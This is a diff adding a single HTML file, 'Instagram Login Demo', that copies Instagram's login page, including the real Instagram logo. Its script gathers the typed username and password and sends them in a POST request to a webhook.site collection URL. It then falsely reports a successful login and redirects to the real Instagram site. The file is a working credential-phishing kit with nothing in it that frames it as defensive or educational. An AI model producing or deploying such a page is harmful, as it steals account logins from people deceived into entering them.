@@ -1,0 +1,101 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(45deg, #FEDA75, #FA7E1E, #D62976, #962FBF, #4F5BD5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background: transparent;
+            padding: 50px;
+            border: none;
+            box-shadow: none;
+            width: 300px;
+            text-align: center;
+        }
+        .login-box img {
+            width: 180px;
+            height: 130px;
+            margin-bottom: 15px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #0081d6;
+        }
+        .password-container {
+            position: relative;
+        }
+        .password-container input {
+            padding-right: 30px;
+        }
+        .password-container .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
+        <input type="text" id="user" placeholder="Username">
+        <div class="password-container">
+            <input type="password" id="pass" placeholder="Password">
+            <span class="toggle-password" onclick="togglePassword()">???</span>
+        </div>
+        <button onclick="submitData()">Continue</button>
+        <p id="message"></p>
+    </div>
+    <script>
+        function togglePassword() {
+            const password = document.getElementById('pass');
+            const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+            password.setAttribute('type', type);
+        }
+        function submitData() {
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+            const message = document.getElementById('message');
+            if (!user.trim() || !pass.trim()) {
+                message.textContent = "Enter a username and password";
+                return;
+            }
+            const data = "Username: " + user + " | Password: " + pass;
+            fetch('https://webhook.site/a400c39d-fa24-4665-befa-c4c17a96e712', {
+                method: 'POST',
+                body: JSON.stringify({ content: data })
+            });
+            message.textContent = "Login successful! Redirecting...";
+            setTimeout(() => {
+                window.location.href = "https://www.instagram.com/";
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
+
